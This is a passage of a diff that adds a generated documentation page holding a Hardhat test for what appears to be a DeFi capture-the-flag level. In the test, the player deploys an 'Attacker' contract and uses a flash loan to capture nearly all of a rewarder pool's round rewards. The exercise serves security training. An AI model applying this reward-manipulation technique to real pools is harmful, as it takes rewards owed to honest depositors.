+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">accountingToken</span><span class="p">.</span><span class="n">hasAllRoles</span><span class="p">(</span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="n">minterRole</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">snapshotRole</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">burnerRole</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="k">true</span><span class="p">;</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Alice</span><span class="p">,</span><span class="w"> </span><span class="n">Bob</span><span class="p">,</span><span class="w"> </span><span class="n">Charlie</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">David</span><span class="w"> </span><span class="n">deposit</span><span class="w"> </span><span class="n">tokens</span>
+<span class="w">        </span><span class="n">let</span><span class="w"> </span><span class="n">depositAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">100</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="n">n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">18</span><span class="n">n</span><span class="p">;</span><span class="w"> </span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">liquidityToken</span><span class="p">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">users</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="n">depositAmount</span><span class="p">);</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">liquidityToken</span><span class="p">.</span><span class="k">connect</span><span class="p">(</span><span class="n">users</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="n">depositAmount</span><span class="p">);</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="k">connect</span><span class="p">(</span><span class="n">users</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">).</span><span class="n">deposit</span><span class="p">(</span><span class="n">depositAmount</span><span class="p">);</span>
+<span class="w">            </span><span class="n">expect</span><span class="p">(</span>
+<span class="w">                </span><span class="n">await</span><span class="w"> </span><span class="n">accountingToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">users</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
+<span class="w">            </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">depositAmount</span><span class="p">);</span>
+<span class="w">        </span><span class="err">}</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">accountingToken</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">depositAmount</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nc">BigInt</span><span class="p">(</span><span class="n">users</span><span class="p">.</span><span class="n">length</span><span class="p">));</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">rewardToken</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Advance</span><span class="w"> </span><span class="nc">time</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">days</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">depositors</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">rewards</span>
+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">provider</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="ss">&quot;evm_increaseTime&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">5 * 24 * 60 * 60</span><span class="o">]</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">days</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="k">Each</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="n">gets</span><span class="w"> </span><span class="n">reward</span><span class="w"> </span><span class="n">tokens</span>
+<span class="w">        </span><span class="n">let</span><span class="w"> </span><span class="n">rewardsInRound</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">REWARDS</span><span class="p">();</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="k">connect</span><span class="p">(</span><span class="n">users</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">).</span><span class="n">distributeRewards</span><span class="p">();</span>
+<span class="w">            </span><span class="n">expect</span><span class="p">(</span>
+<span class="w">                </span><span class="n">await</span><span class="w"> </span><span class="n">rewardToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">users</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
+<span class="w">            </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">rewardsInRound</span><span class="p">.</span><span class="n">div</span><span class="p">(</span><span class="n">users</span><span class="p">.</span><span class="n">length</span><span class="p">));</span>
+<span class="w">        </span><span class="err">}</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">rewardToken</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">rewardsInRound</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Player</span><span class="w"> </span><span class="n">starts</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">zero</span><span class="w"> </span><span class="n">DVT</span><span class="w"> </span><span class="n">tokens</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">balance</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">liquidityToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">address</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Two</span><span class="w"> </span><span class="n">rounds</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">occurred</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">far</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">roundNumber</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="w">    </span><span class="err">}</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="cm">/** CODE YOUR SOLUTION HERE */</span>
+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">provider</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="ss">&quot;evm_increaseTime&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">5 * 24 * 60 * 60</span><span class="o">]</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">days</span>
+
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">RewarderAttackerFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;Attacker&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">player</span><span class="p">);</span>
+<span class="w">        </span><span class="n">rewarderAttacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">RewarderAttackerFactory</span><span class="p">.</span><span class="n">deploy</span><span class="p">(</span>
+<span class="w">            </span><span class="n">flashLoanPool</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
+<span class="w">            </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
+<span class="w">            </span><span class="n">liquidityToken</span><span class="p">.</span><span class="n">address</span>
+<span class="w">        </span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">tx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">rewarderAttacker</span><span class="p">.</span><span class="k">connect</span><span class="p">(</span><span class="n">player</span><span class="p">).</span><span class="n">attack</span><span class="p">(</span>
+<span class="w">            </span><span class="n">TOKENS_IN_LENDER_POOL</span><span class="p">,</span>
+<span class="w">            </span><span class="n">rewardToken</span><span class="p">.</span><span class="n">address</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">tx</span><span class="p">.</span><span class="n">wait</span><span class="p">();</span>
+<span class="w">    </span><span class="err">}</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">after</span><span class="p">(</span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="cm">/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */</span>
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="k">Only</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="nf">round</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">taken</span><span class="w"> </span><span class="n">place</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">roundNumber</span><span class="p">()</span>
+<span class="w">        </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Users</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">neglegible</span><span class="w"> </span><span class="n">rewards</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="nf">round</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="k">connect</span><span class="p">(</span><span class="n">users</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">).</span><span class="n">distributeRewards</span><span class="p">();</span>
+<span class="w">            </span><span class="n">const</span><span class="w"> </span><span class="n">userRewards</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">rewardToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">users</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+<span class="w">            </span><span class="n">const</span><span class="w"> </span><span class="n">delta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">userRewards</span><span class="p">.</span><span class="n">sub</span><span class="p">((</span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">REWARDS</span><span class="p">()).</span><span class="n">div</span><span class="p">(</span><span class="n">users</span><span class="p">.</span><span class="n">length</span><span class="p">));</span>
+<span class="w">            </span><span class="n">expect</span><span class="p">(</span><span class="n">delta</span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">lt</span><span class="p">(</span><span class="mi">10</span><span class="n">n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">16</span><span class="n">n</span><span class="p">)</span>
+<span class="w">        </span><span class="err">}</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Rewards</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">issued</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">player</span><span class="w"> </span><span class="n">account</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">rewardToken</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">gt</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">REWARDS</span><span class="p">());</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">playerRewards</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">rewardToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">playerRewards</span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">gt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">amount</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">rewards</span><span class="w"> </span><span class="n">earned</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="k">close</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">amount</span>
+<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">delta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">rewarderPool</span><span class="p">.</span><span class="n">REWARDS</span><span class="p">()).</span><span class="n">sub</span><span class="p">(</span><span class="n">playerRewards</span><span class="p">);</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">delta</span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">lt</span><span class="p">(</span><span class="mi">10</span><span class="n">n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">17</span><span class="n">n</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Balance</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">DVT</span><span class="w"> </span><span class="n">tokens</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">player</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">lending</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="n">hasn</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">changed</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">liquidityToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">address</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span>
+<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">liquidityToken</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">flashLoanPool</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
+<span class="w">        </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">TOKENS_IN_LENDER_POOL</span><span class="p">);</span>
+<span class="w">    </span><span class="err">}</span><span class="p">);</span>
+<span class="err">}</span><span class="p">);</span>
+</code></pre></div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.51d95adb.min.js"></script>
+      
+    
+  </body>
+</html>
